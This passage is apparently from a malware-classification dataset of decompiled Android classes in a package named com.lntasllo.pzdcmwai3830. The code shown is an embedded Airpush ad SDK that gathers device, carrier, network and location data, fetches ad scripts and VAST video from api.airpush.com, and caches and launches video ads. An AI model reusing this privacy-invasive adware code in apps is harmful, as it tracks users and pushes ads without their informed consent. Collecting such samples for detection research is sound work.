return ""NOT FOUND"";     } catch (    NoSuchAlgorithmException e3) {       e3.printStackTrace();       return ""NOT FOUND"";     } catch (    Exception e4) {       e4.printStackTrace();       return ""NOT FOUND"";     }   }   public static String e(  Context context){     try {       return context.getPackageName();     }  catch (    Exception e2) {       return """";     }   }   public static String f(  Context context){     TelephonyManager telephonyManager;     if (context != null && (telephonyManager=(TelephonyManager)context.getSystemService(""phone"")) != null && telephonyManager.getSimState() == 5) {       return telephonyManager.getSimOperatorName();     }     return """";   }   public static String g(  Context context){     TelephonyManager telephonyManager;     if (context != null && (telephonyManager=(TelephonyManager)context.getSystemService(""phone"")) != null && telephonyManager.getPhoneType() == 1) {       return telephonyManager.getNetworkOperatorName();     }     return """";   }   public static String n(){     return Build.MANUFACTURER;   }   public static int h(  Context context){     if (context == null) {       return 0;     }     NetworkInfo activeNetworkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo();     return (activeNetworkInfo != null && activeNetworkInfo.isConnected() && activeNetworkInfo.getTypeName().equals(""WIFI"")) ? 1 : 0;   }   public static String i(  Context context){     NetworkInfo activeNetworkInfo;     return (context == null || (activeNetworkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo()) == null || !activeNetworkInfo.isConnected() || activeNetworkInfo.getTypeName().equals(""WIFI"")) ? """" : activeNetworkInfo.getSubtypeName();   }   public static boolean j(  android.content.Context r4){     throw new UnsupportedOperationException(""Method not decompiled: com.lntasllo.pzdcmwai3830.o.j(android.content.Context):boolean"");   }   public static String o(){     return h;   }   public static void j(  String str){     h=str;   }   public static String k(  Context context){     if (context == null) {       return """";     }     Display defaultDisplay=((WindowManager)context.getSystemService(""window"")).getDefaultDisplay();     return """" + defaultDisplay.getWidth() + ""_""+ defaultDisplay.getHeight();   }   public static String[] l(  Context context){     Geocoder geocoder;     String[] strArr={"""",""""};     try {       geocoder=new Geocoder(context);     }  catch (    IOException e2) {     } catch (    Exception e3) {     } catch (    Throwable th) {       th.printStackTrace();     }     if (f == null || f.equals(""invalid"") || e == null || e.equals(""invalid"")) {       return strArr;     }     List<Address> fromLocation=geocoder.getFromLocation(Double.parseDouble(f),Double.parseDouble(e),1);     if (!fromLocation.isEmpty()) {       strArr[0]=fromLocation.get(0).getCountryName();       strArr[1]=fromLocation.get(0).getPostalCode();       a(""Postal Code: "" + strArr[1] + "" Country Code: ""+ fromLocation.get(0).getCountryCode());     }     return strArr;   }   public static String p(){     return Locale.getDefault().getDisplayLanguage();   }   public static String m(  Context context){     return """" + context.getResources().getDisplayMetrics().density;   }   public static String n(  Context context){     return """" + context.getResources().getDisplayMetrics().densityDpi;   }   public static boolean o(  Context context){     try {       NetworkInfo activeNetworkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo();       if (activeNetworkInfo != null && activeNetworkInfo.isConnected()) {         return true;       }       Log.e(""AirplaySDK"",""Internet connection not found."");       b.b(""Internet connection not found."");       return false;     }  catch (    Exception e2) {       e2.printStackTrace();       return false;     }   }   public static String p(  Context context){     ApplicationInfo applicationInfo;     try {       PackageManager packageManager=context.getPackageManager();       try {         applicationInfo=packageManager.getApplicationInfo(context.getPackageName(),0);       }  catch (      PackageManager.NameNotFoundException e2) {         applicationInfo=null;       }       return (String)(applicationInfo != null ? packageManager.getApplicationLabel(applicationInfo) : ""(unknown)"");     }  catch (    Exception e3) {       e3.printStackTrace();       return """";     }   }   public static String q(  Context context){     return Settings.Secure.getString(context.getContentResolver(),""install_non_market_apps"");   }   static boolean a(  Context context,  String str) throws NullPointerException, Exception {     return context.getPackageManager().queryIntentActivities(new Intent(str),65536).size() > 0;   }   public static boolean a(  Context context,  Class<?> cls) throws NullPointerException, Exception {     return context.getPackageManager().queryIntentActivities(new Intent(context,cls),65536).size() > 0;   }   public static String r(  Context context){     try {       return context.getSharedPreferences(Initializer.PRODUCT_MRAID,0).getString(""mr"",null);     }  catch (    Exception e2) {       return null;     }   }   public static JSONObject s(  Context context){     boolean z;     boolean z2;     try {       TelephonyManager telephonyManager=(TelephonyManager)context.getSystemService(""phone"");       if (telephonyManager == null || telephonyManager.getSimState() != 5) {         z=false;         z2=false;       }  else {         z=true;         z2=true;       }       boolean a2=Build.VERSION.SDK_INT > 7 ? a(context,""android.intent.action.EDIT"") : false;       boolean z3=(context.checkCallingOrSelfPermission(""android.permission.WRITE_EXTERNAL_STORAGE"") == 0) && Environment.getExternalStorageState().equals(""mounted"");       boolean z4=Build.VERSION.SDK_INT > 10;       JSONObject jSONObject=new JSONObject();       jSONObject.put(""sms"",z2);       jSONObject.put(""tel"",z);       jSONObject.put(""calendar"",a2);       jSONObject.put(""storePictures"",z3);       jSONObject.put(""inlineVideo"",z4);       return jSONObject;     }  catch (    Exception e2) {       e2.printStackTrace();       return null;     }   }   public static float a(  float f2,  Context context) throws Exception {     return (context.getResources().getDisplayMetrics().densityDpi / 160.0f) * f2;   }   public static float b(  float f2,  Context context) throws Exception {     return f2 / (context.getResources().getDisplayMetrics().densityDpi / 160.0f);   } public static final class a implements Runnable {     c<Boolean> a;     private Context b;     public a(    Context context,    c<Boolean> cVar){       this.b=context;       this.a=cVar;     }     @Override public void run(){       HttpURLConnection httpURLConnection;       HttpURLConnection httpURLConnection2=null;       try {         try {           if (o.o(this.b)) {             Log.i(""AirplayMraid"",""Getting mraid>>>>"");             httpURLConnection=(HttpURLConnection)new URL(""http://api.airpush.com/mraid/native_mraid.php"").openConnection();             try {               httpURLConnection.setRequestMethod(""GET"");               httpURLConnection.setConnectTimeout(5000);               httpURLConnection.setReadTimeout(10000);               httpURLConnection.setUseCaches(true);               httpURLConnection.setDefaultUseCaches(true);               httpURLConnection.connect();               if (httpURLConnection.getResponseCode() == 200) {                 BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));                 StringBuffer stringBuffer=new StringBuffer();                 while (true) {                   String readLine=bufferedReader.readLine();                   if (readLine == null) {                     break;                   }                   stringBuffer.append(readLine);                   stringBuffer.append('\r');                 }                 bufferedReader.close();                 SharedPreferences.Editor edit=this.b.getSharedPreferences(Initializer.PRODUCT_MRAID,0).edit();                 edit.putString(""mr"",stringBuffer.toString());                 this.a.a(Boolean.valueOf(edit.commit()));                 if (httpURLConnection != null) {                   httpURLConnection.disconnect();                   return;                 }                 return;               }               Log.i(""AirplayMraid"",""Status Code: "" + httpURLConnection.getResponseCode());               Log.i(""AirplayMraid"",""HTTP Reason: "" + httpURLConnection.getResponseMessage());             }  catch (            Exception e) {               httpURLConnection2=httpURLConnection;               e=e;               e.printStackTrace();               if (httpURLConnection2 != null) {                 httpURLConnection2.disconnect();               }               this.a.a(false);             } catch (            Throwable th) {               httpURLConnection2=httpURLConnection;               th=th;               if (httpURLConnection2 != null) {                 httpURLConnection2.disconnect();               }               throw th;             }           }  else {             httpURLConnection=null;           }           if (httpURLConnection != null) {             httpURLConnection.disconnect();           }         }  catch (        Exception e2) {           e=e2;         }         this.a.a(false);       }  catch (      Throwable th2) {         th=th2;       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.lntasllo.pzdcmwai3830\p.code","abstract class p {   public static long a(  String str) throws NullPointerException, NumberFormatException, Exception {     if (str == null || str.equals("""")) {       throw new NullPointerException(""Time value is null."");     }     StringTokenizer stringTokenizer=new StringTokenizer(str,"":"");     String nextToken=stringTokenizer.nextToken();     String nextToken2=stringTokenizer.nextToken();     String nextToken3=stringTokenizer.nextToken();     System.out.println(nextToken + ""mm "" + nextToken2+ AnalyticsEvent.TYPE_START_SESSION+ nextToken3);     String str2=""0"";     if (nextToken3.contains(""."")) {       StringTokenizer stringTokenizer2=new StringTokenizer(nextToken3,""."");       nextToken3=stringTokenizer2.nextToken();       str2=stringTokenizer2.nextToken();     }     long longValue=Long.valueOf(nextToken).longValue() * 3600 * 1000;     return Long.valueOf(str2).longValue() + (Long.valueOf(nextToken2).longValue() * 60 * 1000) + longValue+ (Long.valueOf(nextToken3).longValue() * 1000);   }   public static String a(  long j){     String num=Integer.toString((int)(j % 60));     String num2=Integer.toString((int)((j % 3600) / 60));     String num3=Integer.toString((int)(j / 3600));     String str=num;     for (int i=0; i < 2; i++) {       if (str.length() < 2) {         str=""0"" + str;       }       if (num2.length() < 2) {         num2=""0"" + num2;       }       if (num3.length() < 2) {         num3=""0"" + num3;       }     }     if (!num3.equals(""00"")) {       return num3 + "":"" + num2+ "":""+ str;     }     if (num3.equals(""00"") && !num2.equals(""00"")) {       return num2 + "":"" + str;     }     return str + ""s"";   }   public static void a(  File file){     if (file.isDirectory()) {       for (      File file2 : file.listFiles()) {         a(file2);       }     }     file.delete();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.lntasllo.pzdcmwai3830\q.code","public class q {   private String a=null;   private String b;   private String c;   private String d;   private String e;   private String f;   private List<HashMap<String,String>> g;   private String h;   private String i;   private String j;   private String k;   private HashMap<String,String> l;   private List<a> m;   void a(  CharSequence charSequence){   }   public q(  Reader reader) throws c, b, XmlPullParserException, Exception, Throwable {     Log.i(""AirPlayVast"",""Parsing vast Xml>>>>>>>.."");     this.m=new ArrayList();     XmlPullParserFactory newInstance=XmlPullParserFactory.newInstance();     newInstance.setNamespaceAware(true);     XmlPullParser newPullParser=newInstance.newPullParser();     newPullParser.setFeature(""http://xmlpull.org/v1/doc/features.html#process-namespaces"",false);     newPullParser.setInput(reader);     newPullParser.nextTag();     newPullParser.require(2,this.a,""VAST"");     this.c=newPullParser.getAttributeValue(this.a,""version"");     Log.i(""AirPlayVast"",""Vast version: "" + this.c);     newPullParser.nextTag();     String name=newPullParser.getName();     if (name.equals(""Error"")) {       String attributeValue=newPullParser.getAttributeValue(this.a,""status"");       String a2=a(newPullParser);       a(""Status: "" + attributeValue + "" Error: ""+ a2);       throw new c(a2,attributeValue);     }     if (name.equals(""Ad"")) {       a(""Inside ad tag"");       this.b=newPullParser.getAttributeValue(this.a,AnalyticsEvent.EVENT_ID);       while (newPullParser.next() != 3) {         if (newPullParser.getEventType() == 2) {           String name2=newPullParser.getName();           if (newPullParser.isEmptyElementTag()) {             a(""Empty Tag: "" + name2);             newPullParser.nextTag();           }  else           if (name2.equals(""Error"")) {             this.k=a(newPullParser);             a(""Ad Error: "" + this.k);           }  else           if (name2.equals(""AdSystem"")) {             this.e=newPullParser.getAttributeValue(this.a,""version"");             this.d=a(newPullParser);             a(""AdSytem version: "" + this.e + "", name: ""+ this.d);           }  else           if (name2.equals(""AdTitle"")) {             this.f=a(newPullParser);             a(""Ad title: "" + this.f);           }  else           if (name2.equals(""Description"")) {             this.h=a(newPullParser);             a(""Desc :"" + this.h);           }  else           if (name2.equals(""Advertiser"")) {             this.i=a(newPullParser);             a(""Advertise name: "" + this.i);           }  else           if (name2.equals(""Servey"")) {             this.j=a(newPullParser);             a(""Survey URI: "" + this.j);           }  else           if (name2.equals(""Pricing"")) {             this.l=new HashMap<>();             String attributeValue2=newPullParser.getAttributeValue(this.a,""model"");             String attributeValue3=newPullParser.getAttributeValue(this.a,""currency"");             String a3=a(newPullParser);             this.l.put(""model"",attributeValue2);             this.l.put(""currency"",attributeValue3);             this.l.put(""Pricing"",a3);             a(""model: "" + attributeValue2 + "", cur: ""+ attributeValue3+ "", price: ""+ a3);           }  else           if (name2.equals(""Impression"")) {             if (this.g == null) {               this.g=new ArrayList();             }             HashMap<String,String> hashMap=new HashMap<>();             String attributeValue4=newPullParser.getAttributeValue(this.a,AnalyticsEvent.EVENT_ID);             String a4=a(newPullParser);             hashMap.put(AnalyticsEvent.EVENT_ID,attributeValue4);             hashMap.put(""Impression"",a4);             this.g.add(hashMap);             a(""Impression Id: "" + attributeValue4 + "", uri: ""+ a4);           }  else           if (name2.equals(""Creative"")) {             this.m.add(new a(newPullParser));           }         }       }       return;     }     throw new b(""Invalid vast XMl"");   }   public String a(  XmlPullParser xmlPullParser) throws XmlPullParserException, IOException {     String nextText; synchronized (xmlPullParser) {       nextText=xmlPullParser.nextText();       if (xmlPullParser.getEventType() != 3) {         xmlPullParser.nextTag();       }     }     return nextText;   } public class a {     private boolean b;     private String c;     private String d;     private String e;     private String f;     private String g;     private List<HashMap<String,Object>> h;     private HashMap<String,String> i;     private String j;     private String k;     private List<HashMap<String,String>> l;     private List<HashMap<String,String>> m;     private List<HashMap<String,Object>> n;     public a(    XmlPullParser xmlPullParser) throws XmlPullParserException, Exception, Throwable {       q.this.a(""Parsing Creative data"");       xmlPullParser.require(2,q.this.a,""Creative"");       this.d=xmlPullParser.getAttributeValue(q.this.a,AnalyticsEvent.EVENT_ID);       this.e=xmlPullParser.getAttributeValue(q.this.a,""sequence"");       this.f=xmlPullParser.getAttributeValue(q.this.a,""AdID"");       while (xmlPullParser.next() != 3) {         if (xmlPullParser.getEventType() == 2) {           String name=xmlPullParser.getName();           q.this.a(""Creative Name: "" + name);           if (xmlPullParser.isEmptyElementTag()) {             q.this.a(""Empty tag in creative: "" + name);             xmlPullParser.nextTag();           }  else           if (xmlPullParser.getName().equals(""Linear"")) {             String attributeValue=xmlPullParser.getAttributeValue(q.this.a,""skipoffset"");             if (attributeValue == null) {               this.b=false;               q.this.a(""AdSkipable: "" + this.b);             }  else {               this.b=true;               this.c=attributeValue;               q.this.a(""AdSkipable: "" + this.b + "", Skip offset: ""+ this.c);             }           }  else           if (name.equals(""Icon"")) {             if (this.h == null) {               this.h=new ArrayList();             }             HashMap<String,Object> hashMap=new HashMap<>();             int a=a(xmlPullParser.getAttributeValue(q.this.a,""width""));             int a2=a(xmlPullParser.getAttributeValue(q.this.a,""height""));             String attributeValue2=xmlPullParser.getAttributeValue(q.this.a,""program"");             String attributeValue3=xmlPullParser.getAttributeValue(q.this.a,""xPosition"");             String attributeValue4=xmlPullParser.getAttributeValue(q.this.a,""yPosition"");             String attributeValue5=xmlPullParser.getAttributeValue(q.this.a,""Duration"");             String attributeValue6=xmlPullParser.getAttributeValue(q.this.a,""apiFramework"");             String attributeValue7=xmlPullParser.getAttributeValue(q.this.a,""offset"");             q.this.a(""ICON: width: "" + a + "", height: ""+ a2+ "", program: ""+ attributeValue2+ "", xPosition: ""+ attributeValue3+ "", duration:""+ attributeValue5+ "", apiFramework:""+ attributeValue6+ "", offset:""+ attributeValue7);             hashMap.put(""width"",Integer.valueOf(a));             hashMap.put(""height"",Integer.valueOf(a2));             hashMap.put(""program"",attributeValue2);             hashMap.put(""xPosition"",attributeValue3);             hashMap.put(""yPosition"",attributeValue4);             hashMap.put(""apiFramework"",attributeValue6);             hashMap.put(""Duration"",attributeValue5);             hashMap.put(""offset"",attributeValue7);             while (xmlPullParser.next() != 3) {               if (xmlPullParser.getEventType() == 2) {                 String name2=xmlPullParser.getName();                 q.this.a(""Icon Name: "" + name);                 if (xmlPullParser.isEmptyElementTag()) {                   q.this.a(""Empty tag in creative: "" + name);                   xmlPullParser.nextTag();                 }  else                 if (name2.equals(""StaticResource"")) {                   String attributeValue8=xmlPullParser.getAttributeValue(q.this.a,""creativeType"");                   String a3=q.this.a(xmlPullParser);                   hashMap.put(""creativeType"",attributeValue8);                   hashMap.put(""StaticResource"",a3);                   q.this.a(""Creative type:"" + attributeValue8 + "", Static res: ""+ a3);                 }  else                 if (name2.equals(""IconClickThrough"")) {                   String a4=q.this.a(xmlPullParser);                   hashMap.put(""IconClickThrough"",a4);                   q.this.a(""Icon click through: "" + a4);                   xmlPullParser.nextTag();                 }  else                 if (name2.equals(""IconClickTracking"")) {                   String a5=q.this.a(xmlPullParser);                   hashMap.put(""IconClickTracking"",a5);                   q.this.a(""IconClickTracking: "" + a5);                 }  else                 if (name2.equals(""IconViewTracking"")) {                   String a6=q.this.a(xmlPullParser);                   hashMap.put(""IconViewTracking"",a6);                   q.this.a(""IconViewTracking: "" + a6);                 }               }             }             this.h.add(hashMap);             xmlPullParser.nextTag();           }  else           if (name.equals(""Duration"")) {             this.g=q.this.a(xmlPullParser);             q.this.a(""Duration: "" + this.g);           }  else           if (name.equals(""TrackingEvents"")) {             q.this.a(""inside tracking event."");             while (xmlPullParser.next() != 3) {               if (xmlPullParser.getEventType() == 2) {                 String name3=xmlPullParser.getName();                 if (xmlPullParser.isEmptyElementTag()) {                   q.this.a(""Empty tag in tracking: "" + name3);                   xmlPullParser.nextTag();                 }  else                 if (name3.equals(""Tracking"")) {                   if (this.i == null) {                     this.i=new HashMap<>();                   }                   String attributeValue9=xmlPullParser.getAttributeValue(q.this.a,""event"");                   String a7=q.this.a(xmlPullParser);                   this.i.put(attributeValue9,a7);                   q.this.a(""Tracking event: "" + attributeValue9 + "", url: ""+ a7);                 }               }             }           }  else           if (name.equals(""AdParameters"")) {             this.j=q.this.a(xmlPullParser);             q.this.a(""AdParameters: "" + this.j);           }  else           if (name.equals(""VideoClicks"")) {             while (xmlPullParser.next() != 3) {               if (xmlPullParser.getEventType() == 2) {                 String name4=xmlPullParser.getName();                 if (xmlPullParser.isEmptyElementTag()) {                   q.this.a(""Empty tag in creative: "" + name4);                   xmlPullParser.nextTag();                 }  else                 if (name4.equals(""ClickThrough"")) {                   this.k=q.this.a(xmlPullParser);                   q.this.a(""Video click through url: "" + this.k);                 }  else                 if (name4.equals(""ClickTracking"")) {                   HashMap<String,String> hashMap2=new HashMap<>();                   String attributeValue10=xmlPullParser.getAttributeValue(q.this.a,AnalyticsEvent.EVENT_ID);                   String a8=q.this.a(xmlPullParser);                   hashMap2.put(AnalyticsEvent.EVENT_ID,attributeValue10);                   hashMap2.put(""ClickTracking"",a8);                   if (this.l == null) {                     this.l=new ArrayList();                   }                   this.l.add(hashMap2);                   q.this.a(""Video click tracking ID: "" + attributeValue10 + "", url: ""+ a8);                 }  else                 if (name4.equals(""CustomClick"")) {                   HashMap<String,String> hashMap3=new HashMap<>();                   String attributeValue11=xmlPullParser.getAttributeValue(q.this.a,AnalyticsEvent.EVENT_ID);                   String a9=q.this.a(xmlPullParser);                   hashMap3.put(AnalyticsEvent.EVENT_ID,attributeValue11);                   hashMap3.put(""CustomClick"",a9);                   if (this.m == null) {                     this.m=new ArrayList();                   }                   this.m.add(hashMap3);                   q.this.a(""Video Custom click tracking ID: "" + attributeValue11 + "", url: ""+ a9);                 }               }             }           }  else           if (name.equals(""MediaFiles"")) {             while (xmlPullParser.next() != 3) {               if (xmlPullParser.getEventType() == 2) {                 String name5=xmlPullParser.getName();                 if (xmlPullParser.isEmptyElementTag()) {                   q.this.a(""Empty tag in media: "" + name5);                   xmlPullParser.nextTag();                 }  else                 if (name5.equals(""MediaFile"")) {                   String attributeValue12=xmlPullParser.getAttributeValue(q.this.a,AnalyticsEvent.EVENT_ID);                   String attributeValue13=xmlPullParser.getAttributeValue(q.this.a,""delivery"");                   String attributeValue14=xmlPullParser.getAttributeValue(q.this.a,AnalyticsSQLiteHelper.EVENT_LIST_TYPE);                   int a10=a(xmlPullParser.getAttributeValue(q.this.a,""bitrate""));                   int a11=a(xmlPullParser.getAttributeValue(q.this.a,""width""));                   int a12=a(xmlPullParser.getAttributeValue(q.this.a,""height""));                   boolean parseBoolean=Boolean.parseBoolean(xmlPullParser.getAttributeValue(q.this.a,""scalable""));                   boolean parseBoolean2=Boolean.parseBoolean(xmlPullParser.getAttributeValue(q.this.a,""maintainAspectRatio""));                   String attributeValue15=xmlPullParser.getAttributeValue(q.this.a,""apiFramework"");                   String attributeValue16=xmlPullParser.getAttributeValue(q.this.a,""codec"");                   int a13=a(xmlPullParser.getAttributeValue(q.this.a,""maxBitrate""));                   int a14=a(xmlPullParser.getAttributeValue(q.this.a,""minBitrate""));                   String a15=q.this.a(xmlPullParser);                   q.this.a(""Media id: "" + attributeValue12 + "", delivery: ""+ attributeValue13+ "", type: ""+ attributeValue14+ "", bitrate: ""+ a10+ "", width: ""+ a11+ "", height: ""+ a12+ "", scalable: ""+ parseBoolean+ "", aspect ratio: ""+ parseBoolean2+ "", apiFrameowrk: ""+ attributeValue15+ "", codec: ""+ attributeValue16+ "", maxBitrate: ""+ a13+ "", minBitrate: ""+ a14+ "", URI: ""+ a15);                   HashMap<String,Object> hashMap4=new HashMap<>();                   hashMap4.put(AnalyticsEvent.EVENT_ID,attributeValue12);                   hashMap4.put(""delivery"",attributeValue13);                   hashMap4.put(AnalyticsSQLiteHelper.EVENT_LIST_TYPE,attributeValue14);                   hashMap4.put(""bitrate"",Integer.valueOf(a10));                   hashMap4.put(""width"",Integer.valueOf(a11));                   hashMap4.put(""height"",Integer.valueOf(a12));                   hashMap4.put(""scalable"",Boolean.valueOf(parseBoolean));                   hashMap4.put(""maintainAspectRatio"",Boolean.valueOf(parseBoolean2));                   hashMap4.put(""apiFramework"",attributeValue15);                   hashMap4.put(""codec"",attributeValue16);                   hashMap4.put(""maxBitrate"",Integer.valueOf(a13));                   hashMap4.put(""minBitrate"",Integer.valueOf(a14));                   hashMap4.put(""MediaFile"",a15);                   if (this.n == null) {                     this.n=new ArrayList();                   }                   this.n.add(hashMap4);                 }               }             }           }         }       }     }     public boolean a(){       return this.b;     }     public String b(){       return this.c;     }     public List<HashMap<String,Object>> c(){       return this.h;     }     public HashMap<String,String> d(){       return this.i;     }     public String e(){       return this.j;     }     public String f(){       return this.k;     }     public List<HashMap<String,String>> g(){       return this.l;     }     public List<HashMap<String,String>> h(){       return this.m;     }     public List<HashMap<String,Object>> i(){       return this.n;     }     private int a(    String str){       try {         return Integer.parseInt(str);       }  catch (      NumberFormatException|Exception e) {         return 0;       }     }   } public static class c extends IOException {     private static final long serialVersionUID=1;     private int a;     public c(    String str,    String str2){       super(str);       try {         this.a=Integer.parseInt(str2);       }  catch (      NumberFormatException e) {       }     }     public int a(){       return this.a;     }   } public static class b extends IOException {     private static final long serialVersionUID=1;     public b(    String str){       super(str);     }   }   public String a(){     return this.f;   }   public List<HashMap<String,String>> b(){     return this.g;   }   public String c(){     return this.h;   }   public String d(){     return this.i;   }   public String e(){     return this.k;   }   public List<a> f(){     return this.m;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.lntasllo.pzdcmwai3830\r.code","public class r implements c<String> {   private static final String TAG=""AirPlayVast"";   private static q a;   private Context b;   public static q b(){     return a;   }   @Override public void a(){     try {       new Thread(new i(this.b,this,new ArrayList(),""https://api.airpush.com/Vast/vastadcall.php"",0L,true),""vast"").start();     }  catch (    NullPointerException e) {       Log.e(TAG,""Video ad"",e);     } catch (    Exception e2) {       Log.e(TAG,""Error occurred while fetching Video ad"",e2);     }   }   @Override public void a(  String str){     Log.i(TAG,""Video Ad: "" + str);     if (str == null || str.equals("""")) {       Log.w(TAG,""Video ad response is null"");     }  else {       b(str);     }   }   void b(  String str){     try {       m.b(this.b);       a=new q(new StringReader(str));       HashMap<String,Object> hashMap=a.f().get(0).i().get(0);       String obj=hashMap.get(""MediaFile"").toString();       String obj2=hashMap.get(""delivery"").toString();       if (obj != null && !obj.equals("""")) {         if (obj2 != null && obj2.equals(""progressive"")) {           c(obj);         }  else         if (b.d) {           new d(this.b).a(a.EnumC0031a.video,str,obj);           b.a(a.EnumC0031a.video);         }  else {           Log.e(TAG,""deleviery type streaming "" + obj);           Intent intent=new Intent(this.b,(Class<?>)VideoAdActivity.class);           intent.setAction(""play_video"");           intent.setFlags(268435456);           intent.addFlags(8388608);           intent.addFlags(536870912);           intent.setData(Uri.parse(obj));           this.b.startActivity(intent);           m.b(this.b);         }       }  else {         Log.e(TAG,""Ad url is invalid: "" + obj);       }     }  catch (    q.b e) {     } catch (    q.c e2) {       Log.e(TAG,e2.getMessage());       b.a(e2.a(),e2.getMessage());     } catch (    XmlPullParserException e3) {       e3.printStackTrace();     } catch (    Exception e4) {       e4.printStackTrace();     } catch (    Throwable th) {       th.printStackTrace();     }   }   private void c(  String str){     try {       String externalStorageState=Environment.getExternalStorageState();       if (!Boolean.valueOf(externalStorageState.equals(""mounted"") && !externalStorageState.equals(""mounted_ro"")).booleanValue()) {         String str2=""SD Card  is not available for caching video. SD Card storage state: "" + externalStorageState;         Log.e(TAG,str2);         b.b(str2);       }  else {         AnonymousClass1 anonymousClass1=new AnonymousClass1(str);         if (o.o(this.b)) {           anonymousClass1.a();         }       }     }  catch (    Exception e) {       e.printStackTrace();     }   } public class AnonymousClass1 implements c<String> {     String a="""";     final String b;     AnonymousClass1(    String str){       this.b=str;     }     @Override public void a(    String str){       o.a(""Video file: "" + str);       if (str != null) {         try {           if (!str.equals("""")) {             if (b.d) {               if (new d(r.this.b).a(a.EnumC0031a.video,str,str)) {                 b.a(a.EnumC0031a.video);               }  else               if (b.a != null) {                 b.b(""Video ad not cached."");               }             }  else {               Intent intent=new Intent(r.this.b,(Class<?>)VideoAdActivity.class);               intent.setAction(""play_video"");               intent.setFlags(268435456);               intent.addFlags(8388608);               intent.addFlags(536870912);               intent.setData(Uri.parse(str));               r.this.b.startActivity(intent);               m.b(r.this.b);             }           }         }  catch (        Exception e) {           Log.e(r.TAG,""Error occured while download video"",e);           return;         }       }       Log.e(r.TAG,""Not able to download video"");     }     @Override public void a(){       try {         File file=new File(Environment.getExternalStorageDirectory(),""ap_video"");         if (file.exists() && file.isDirectory()) {           p.a(file);           file.mkdirs();           this.a=file.getAbsolutePath();         }  else         if (file.mkdirs()) {           this.a=file.getAbsolutePath();         }         new Thread(new Runnable(){           @Override public void run(){             try {               try {                 URLConnection openConnection=new URL(AnonymousClass1.this.b).openConnection();                 openConnection.setConnectTimeout(7000);                 openConnection.setReadTimeout(7000);                 openConnection.connect();                 Log.i(r.TAG,""Content-length: "" + openConnection.getContentLength());                 InputStream inputStream=openConnection.getInputStream();                 File file2=new File(AnonymousClass1.this.a,""ad_video.mp4"");                 try {                   if (file2.exists()) {                     file2.delete();                   }                 }  catch (                Exception e) {                   e.printStackTrace();                 }                 FileOutputStream fileOutputStream=new FileOutputStream(file2);                 byte[] bArr=new byte[android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT];                 while (true) {                   int read=inputStream.read(bArr);                   if (read > 0) {                     fileOutputStream.write(bArr,0,read);                   }  else {                     fileOutputStream.close();                     AnonymousClass1.this.a(file2.getAbsolutePath());                     return;                   }                 }               }  catch (              MalformedURLException e2) {                 e2.printStackTrace();                 AnonymousClass1.this.a((String)null);               }             }  catch (            SocketTimeoutException e3) {               e3.printStackTrace();               AnonymousClass1.this.a((String)null);             } catch (            IOException e4) {               e4.printStackTrace();               AnonymousClass1.this.a((String)null);             }           }         } ,""dwn_video"").start();       }  catch (      Exception e) {         e.printStackTrace();       } catch (      Throwable th) {       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.lntasllo.pzdcmwai3830\s.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6474f5a0"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.lntasllo.pzdcmwai3830\SmartWallActivity.code","!org.eclipse.jdt.core.dom.TypeDeclaration@7675bd05"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.lntasllo.pzdcmwai3830\VideoAdActivity.code","!org.eclipse.jdt.core.dom.TypeDeclaration@1dc4bba9"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.lntasllo.pzdcmwai3830\VpaidLayout.code","public class VpaidLayout extends RelativeLayout {   private final float b;   private Context c;   public VpaidLayout(  Activity activity) throws NullPointerException, Exception {     super(activity);     this.c=activity;     this.b=activity.getResources().getDisplayMetrics().density;     setLayoutParams(new RelativeLayout.LayoutParams(-1,-1));     q.a aVar=VideoAdActivity.this.y.f().get(0);     final ImageView imageView=new ImageView(activity);     imageView.setId(102);     try {       List<HashMap<String,Object>> c=aVar.c();       if (c == null || c.isEmpty()) {         o.a(""hashmap empty"");       }       HashMap<String,Object> hashMap=c.get(0);       if (hashMap.isEmpty()) {         o.a(""hash map"");       }       int intValue=((Integer)hashMap.get(""width"")).intValue();       int intValue2=((Integer)hashMap.get(""height"")).intValue();       System.out.println(""width: "" + intValue);       String obj=hashMap.get(""xPosition"").toString();       String obj2=hashMap.get(""yPosition"").toString();       String obj3=hashMap.containsKey(""offset"") ? null : hashMap.get(""offset"").toString();       final String obj4=hashMap.containsKey(""Duration"") ? null : hashMap.get(""Duration"").toString();       String obj5=hashMap.get(""StaticResource"").toString();       System.out.println(""icon url: "" + obj5);       a(obj5,imageView);       if (obj3 != null && obj3.contains("":"")) {         VideoAdActivity.this.a.postDelayed(new Runnable(){           @Override public void run(){             imageView.setVisibility(0);             Runnable runnable=new Runnable(){               @Override public void run(){                 imageView.setVisibility(8);               }             } ;             if (obj4 != null && obj4.contains("":"")) {               try {                 VideoAdActivity.this.a.postDelayed(runnable,p.a(obj4));               }  catch (              NullPointerException e) {                 e.printStackTrace();               } catch (              NumberFormatException e2) {                 e2.printStackTrace();               } catch (              Exception e3) {                 e3.printStackTrace();               }             }           }         } ,p.a(obj3));       }       RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(intValue,intValue2);       if (obj.equals(""left"")) {         layoutParams.addRule(9);       }  else       if (obj.equals(""right"")) {         layoutParams.addRule(11);       }  else {         try {           layoutParams.leftMargin=(int)o.b(Float.parseFloat(obj),activity);         }  catch (        Exception e) {           e.printStackTrace();         }       }       if (obj2.equals(""top"")) {         layoutParams.addRule(10);       }  else       if (obj2.equals(""bottom"")) {         layoutParams.addRule(12);       }  else {         try {           